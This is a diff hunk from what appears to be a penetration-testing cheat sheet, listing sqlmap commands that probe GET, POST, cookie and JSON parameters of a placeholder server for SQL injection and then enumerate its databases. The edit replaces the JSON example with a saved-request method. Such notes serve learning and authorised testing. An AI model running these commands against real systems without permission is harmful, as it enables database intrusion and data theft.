@@ -24,7 +24,7 @@ SQLmap
 - GET: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php?id=1"`
 - POST: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1"`
 - Cookies: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --cookie="id=1*"`
-- JSON:  `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "{'id':1*}"`
+- JSON:  `Copy Request Headers --> req.txt; add in the JSON with "" surrounding the variables; sqlmap -r req.txt`
 
 
 1. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" --dbs`
